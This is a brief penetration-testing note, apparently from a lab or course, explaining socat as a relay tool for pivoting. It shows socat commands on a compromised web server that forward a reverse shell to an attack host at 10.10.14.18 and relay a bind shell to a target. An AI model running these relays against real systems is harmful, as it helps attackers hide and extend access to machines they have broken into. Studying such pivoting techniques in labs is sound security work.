
---
`Socat` is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

### Starting Socat Listener

---
#### Reverse shell
```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18).

#### Bind shell
```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:[TargetIP]:8443
```



